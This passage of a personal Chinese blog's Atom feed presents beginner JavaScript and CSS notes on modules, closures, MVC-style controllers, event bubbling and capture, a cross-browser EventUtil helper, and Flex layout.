    <content type="html"><![CDATA[<blockquote><p>一、模块化</p></blockquote><p><strong>目的：通过对文件的命名和代码的简化，可以更加方便的辨别代码的功能与作用。</strong></p><p>以js代码为例，我们把admin.js，按照功能拆分成module-1.js等三个文件，形成模块。这样每个文件的代码都会小而清晰，这也就是模块化的一种体现。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--index.html--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    module-1 of html</div><div class="line">    module-2 of html</div><div class="line">    module-3 of html</div><div class="line">    <span class="tag">&lt;<span class="name">scirpt</span> <span class="attr">src</span>=<span class="string">"module-1.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </div><div class="line">    <span class="tag">&lt;<span class="name">scirpt</span> <span class="attr">src</span>=<span class="string">"module-2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </div><div class="line">    <span class="tag">&lt;<span class="name">scirpt</span> <span class="attr">src</span>=<span class="string">"module-3.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>二、立即执行函数</p></blockquote><p>1、不同模块代码里，相同的全局变量会造成代码冲突，所以我们需要把全局变量变成局部变量——立即执行函数的使用。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">!<span class="function"><span class="keyword">function</span><span class="params">()</span><span class="comment">&#123;</span></span></div><div class="line">    your code</div><div class="line">&#125;.<span class="title">call</span><span class="params">()</span></div></pre></td></tr></table></figure></p><p>2、代码模块隔离之后如何进行通信呢？利用<strong>闭包</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// module-1</span></div><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;.call()</div><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="comment">//  code of module-1</span></div><div class="line">    <span class="keyword">var</span> person = &#123;</div><div class="line">        <span class="attr">name</span>: <span class="string">'frank'</span>,</div><div class="line">        <span class="attr">age</span>: <span class="number">18</span></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">window</span>.frankGrowUp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        person.age += <span class="number">1</span>    <span class="comment">// 函数用了它以外的变量 person，所以fn和person就是闭包 ，闭包用来对数据隐藏细节，还可以进行访问控制</span></div><div class="line">        <span class="keyword">return</span> person.age</div><div class="line">    &#125;</div><div class="line">&#125;.call()</div><div class="line"></div><div class="line"><span class="comment">// module-2</span></div><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="comment">// code of module-2</span></div><div class="line">    <span class="keyword">var</span> newAge = <span class="built_in">window</span>.frankGrowUp()</div><div class="line">    <span class="built_in">console</span>.log(newAge)  <span class="comment">// 19</span></div><div class="line">&#125;.call()</div></pre></td></tr></table></figure></p><ul><li>立即执行函数使得 <code>person</code> 无法被外部访问</li><li>闭包使得匿名函数可以操作 <code>person</code></li><li><code>window.frankGrowUp</code> 保存了匿名函数的地址</li><li>任何地方都可以使用<code>window.frankGrowUp</code>操作 <code>person</code> =&gt; 任何地方都可以使用 <code>window.frankGrowUp</code>操作 <code>person</code>，但是不能直接访问 <code>person</code></li></ul><blockquote><p>三、Model(模型) View(视图) Controller(控制)</p></blockquote><p><strong>html就放在view部分，js操作就放在controller部分</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--index.html--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"view-1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"view-2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"view-3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">scirpt</span> <span class="attr">src</span>=<span class="string">"module-1.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </div><div class="line">    <span class="tag">&lt;<span class="name">scirpt</span> <span class="attr">src</span>=<span class="string">"module-2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </div><div class="line">    <span class="tag">&lt;<span class="name">scirpt</span> <span class="attr">src</span>=<span class="string">"module-3.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// module-1.js 模块 1</span></div><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> view = 找到对应的模块<span class="number">1</span>元素 </div><div class="line">    <span class="keyword">var</span> controller = &#123;</div><div class="line">        <span class="attr">view</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params">view</span>) </span>&#123;</div><div class="line">            <span class="keyword">this</span>.view = view <span class="comment">// 给controller.view 赋值</span></div><div class="line">            <span class="keyword">this</span>.操作<span class="number">1</span>()    <span class="comment">// 这里的 this是通过 controller 对象调用决定的（最下面）</span></div><div class="line">            <span class="keyword">this</span>.操作<span class="number">2</span>()</div><div class="line">        &#125;,</div><div class="line">        操作<span class="number">1</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</div><div class="line">        操作<span class="number">2</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</div><div class="line">    &#125;</div><div class="line">    controller.init(view)    <span class="comment">// 执行操作</span></div><div class="line">&#125;.call()</div></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// module-2.js 模块 2</span></div><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> view = <span class="built_in">document</span>.querySelector(<span class="string">'#view-2'</span>)  </div><div class="line">    <span class="keyword">var</span> controller = &#123;</div><div class="line">        <span class="attr">view</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params">view</span>) </span>&#123;</div><div class="line">            <span class="keyword">this</span>.view = view </div><div class="line">            <span class="keyword">this</span>.bindEvents()           <span class="comment">// this.bindEvents.call(this)</span></div><div class="line">        &#125;,</div><div class="line">        <span class="attr">bindEvents</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="keyword">var</span> view = <span class="keyword">this</span>.view</div><div class="line">            <span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>,(x) =&gt; &#123;</div><div class="line">                <span class="keyword">this</span>           <span class="comment">// 通过箭头函数让函数内外this不变, this相当于一个变量</span></div><div class="line">                                 <span class="comment">// 如果是f()&#123;&#125;则this是用户触发的元素,可通过bind()绑定this</span></div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line">        <span class="attr">active</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="keyword">this</span>.view.classList.add(<span class="string">'xxx'</span>)</div><div class="line">        &#125;,</div><div class="line">        <span class="attr">deactive</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="keyword">this</span>.view.classList.remove(<span class="string">'yyy'</span>)</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    controller.init(view)         <span class="comment">// controller.init.call(controller, view)</span></div><div class="line">&#125;.call()</div></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// module-3.js 模块 3</span></div><div class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> view = 找到对应的模块<span class="number">3</span>元素 </div><div class="line">    <span class="keyword">var</span> controller = &#123;</div><div class="line">        <span class="attr">view</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">swiper</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">swiperOptions</span>: &#123;</div><div class="line">            选项<span class="number">1</span>：xxx,</div><div class="line">            选项<span class="number">2</span>： xxx,</div><div class="line">            ……</div><div class="line">        &#125;</div><div class="line">        init: <span class="function"><span class="keyword">function</span>(<span class="params">view</span>) </span>&#123;</div><div class="line">            <span class="keyword">this</span>.view = view </div><div class="line">            <span class="keyword">this</span>.initSwiper()</div><div class="line">        &#125;,</div><div class="line">        <span class="attr">initSwiper</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">            <span class="keyword">this</span>.swiper = <span class="keyword">new</span> Swiper(</div><div class="line">                <span class="keyword">this</span>.view.querySelector(<span class="string">'选择器'</span>),</div><div class="line">                <span class="keyword">this</span>.swiperOptions</div><div class="line">            )</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    controller.init(view)    </div><div class="line">&#125;.call()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、模块化&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;目的：通过对文件的命名和代码的简化，可以更加方便的辨别代码的功能与作用。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以js代码为例，我们把admin.js，按照功能拆分成module-1.js等三个文件，形成模块。这样每个文件的代码都会小而清晰，这也就是模块化的一种体现。&lt;br&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--index.html--&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    module-1 of html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    module-2 of html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    module-3 of html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;scirpt&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;module-1.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;scirpt&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;module-2.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;scirpt&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;module-3.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="wangsiyuan233.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>窗口高度与obj的高度</title>
    <link href="wangsiyuan233.github.io/2018/05/07/47%E5%90%84%E7%A7%8D%E9%AB%98%E5%BA%A6/"/>
    <id>wangsiyuan233.github.io/2018/05/07/47各种高度/</id>
    <published>2018-05-08T02:55:28.000Z</published>
    <updated>2018-05-08T02:56:04.084Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.imgur.com/nVbZzPn.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://i.imgur.com/nVbZzPn.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="javascript" scheme="wangsiyuan233.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>捕获/阻止捕获、冒泡/阻止冒泡</title>
    <link href="wangsiyuan233.github.io/2018/05/06/46%E5%86%92%E6%B3%A1%E4%B8%8E%E6%8D%95%E8%8E%B7/"/>
    <id>wangsiyuan233.github.io/2018/05/06/46冒泡与捕获/</id>
    <published>2018-05-06T11:31:26.000Z</published>
    <updated>2018-05-06T11:56:30.074Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote><p>一、冒泡事件</p></blockquote><p>1、虽然我们只点击了button元素，但是，button外的事件<strong>由内向外</strong>以此被触发，触发的顺序是由DOM树的下层到DOM树的最上面，故称为冒泡。<br>2、如果我们不希望事件冒泡呢？那么如何阻止事件冒泡？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"button"</span>).addEventListener(<span class="string">"click"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">        alert(<span class="string">"button"</span>);</div><div class="line">        event.stopPropagation();    </div><div class="line">&#125;,<span class="literal">false</span>);</div></pre></td></tr></table></figure></p><p>这样，点击button后，只会弹出一个弹窗，显示button。<br>3、冒泡的终点是 window</p><blockquote><p>二、捕获事件</p></blockquote><p>1、把<code>addEventListener()</code>方法的第三个参数由前面例子的<code>false</code>修改为了<code>true</code>,也就是使用捕获方式获得<code>button</code>，<br>2、最外层的事件先被触发，最后才是我们点击的button事件被触发，这便是事件捕获；<br>3、<code>stopPropagation()</code> 和 <code>stopImmediatePropagation()</code> 都可以阻止事件冒泡和事件捕获；<br>4、<code>stopImmediatePropagation()</code> 不仅阻止捕获和冒泡，还阻止该元素的其他事件发生。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote&gt;
&lt;p&gt;一、冒泡事件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、虽然我们只点击了button元素，但是，button外的事件&lt;strong&gt;由内向外&lt;/strong&gt;以此被触发，触发的顺序是由DOM树的下层到DOM树
      
    
    </summary>
    
    
      <category term="javascript" scheme="wangsiyuan233.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>EventUtil--js事件封装</title>
    <link href="wangsiyuan233.github.io/2018/05/05/45EventUtil/"/>
    <id>wangsiyuan233.github.io/2018/05/05/45EventUtil/</id>
    <published>2018-05-05T12:13:36.000Z</published>
    <updated>2018-05-05T12:21:55.975Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>跨浏览器的事件对象EventUtil</p></blockquote><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> EventUtil = &#123;</div><div class="line"></div><div class="line"><span class="comment">//事件监听</span></div><div class="line">    addHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element,type,handler</span>) </span>&#123; </div><div class="line">        <span class="keyword">if</span>(element.addEventListener) &#123;</div><div class="line">            element.addEventListener(type,handler,<span class="literal">false</span>);</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(element.attachEvent) &#123;</div><div class="line">            element.attachEvent(<span class="string">"on"</span>+type,handler);</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            element[<span class="string">"on"</span> +type] = handler;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//移除事件监听</span></div><div class="line">    removeHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element,type,handler</span>)</span>&#123; </div><div class="line">        <span class="keyword">if</span>(element.removeEventListener) &#123;</div><div class="line">            element.removeEventListener(type,handler,<span class="literal">false</span>);</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(element.detachEvent) &#123;</div><div class="line">            element.detachEvent(<span class="string">"on"</span>+type,handler);</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            element[<span class="string">"on"</span> +type] = <span class="literal">null</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//获取event对象，返回event对象的引用</span></div><div class="line">    getEvent: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> event ? event : <span class="built_in">window</span>.event;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//返回事件目标。</span></div><div class="line">    getTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//取消或者阻止事件默认行为</span></div><div class="line">    preventDefault: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(event.preventDefault) &#123;</div><div class="line">            event.preventDefault();</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            event.returnValue = <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//阻止事件流，阻止事件冒泡</span></div><div class="line">    stopPropagation: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span>(event.stopPropagation) &#123;</div><div class="line">            event.stopPropagation();</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            event.cancelBubble = <span class="literal">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//返回相关元素信息（仅对于mouseover和mouseout事件）</span></div><div class="line">    getRelatedTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span> (event.relatedTarget)&#123;</div><div class="line">            <span class="keyword">return</span> event.relatedTarget;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.toElement)&#123;</div><div class="line">            <span class="keyword">return</span> event.toElement;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.fromElement)&#123;</div><div class="line">            <span class="keyword">return</span> event.fromElement;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//获取鼠标滚轮增量值，检测是否包含WheelDelta</span></div><div class="line">    getWheelDelta: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span>(event.wheelDelta) &#123;</div><div class="line">            <span class="keyword">return</span> event.wheelDelta;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> -event.detail * <span class="number">40</span></div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//获取键盘按键键码。</span></div><div class="line">    getCharCode: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> event.charCode == <span class="string">'number'</span>) &#123;</div><div class="line">            <span class="keyword">return</span> event.charCode;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> event.keyCode;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line"></div><div class="line"><span class="comment">//在mouseup或者mousedown的时候，event存在一个button属性，用于判断是按了鼠标左键，右键，还是中键，0鼠标主键按钮，1是中间，2是次键（右键）</span></div><div class="line">    getButton:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.implementation.hasFeature(<span class="string">"MouseEvents"</span>,<span class="string">"2.0"</span>))&#123;</div><div class="line">            <span class="keyword">return</span> event.button;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">switch</span>(event.button)&#123;</div><div class="line">                <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">                <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                <span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">                <span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">                  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">                <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                <span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">                   <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">                <span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">                  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>上面就是我们封装的事件对象。</p><p>用法超级简单，例如click事件:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> btn1 = <span class="built_in">document</span>.getElementById(<span class="string">"myBtn1"</span>);</div><div class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">alert(<span class="string">"hello haorooms"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">EventUtil.addHandler(btn1, <span class="string">"click"</span>, handler);</div><div class="line"><span class="comment">//EventUtil.removeHandler(btn1, "click", handler);</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;跨浏览器的事件对象EventUtil&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="wangsiyuan233.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Flex布局</title>
    <link href="wangsiyuan233.github.io/2018/04/21/44Flex%E5%B8%83%E5%B1%80/"/>
    <id>wangsiyuan233.github.io/2018/04/21/44Flex布局/</id>
    <published>2018-04-21T10:47:26.000Z</published>
    <updated>2018-04-21T11:05:39.525Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Flex出现前</p></blockquote><p>我们是这样布局的：<br>1、正常文档流<br>2、<code>float</code> + <code>clear</code> 清除浮动<br>3、<code>relative</code> + <code>absolute</code><br>4、负<code>margin</code><br><a id="more"></a></p><blockquote><p>拥有Flex时</p></blockquote><p>上面的问题<br>迎刃而解！！<br>咯咯哒</p><p><strong>–&gt; flex-content</strong><br>1、<code>flex-direction</code>: 默认是 横向<code>row</code>;<br>2、<code>flex-wrap</code>: 默认是 换行<code>wrap</code>;<br>3、<code>flex-flow</code>: 默认是 <code>row</code> + <code>wrap</code>;<br>4、<code>justify-content</code>: 主轴对齐方式；<br>    <code>space-between</code>: 空余位置在中间；<br>    <code>space-around</code>： 空余位置均匀分布；<br>    <code>flex-start</code>: 向起点靠；<br>5、<code>align-items</code>: 侧轴对齐；</p><p><strong>–&gt; flex-items</strong><br>1、<code>flex</code>: 默认是 <code>flex-grow</code> + <code>flex-shrink</code><br>2、<code>order</code>: 改变元素的顺序</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
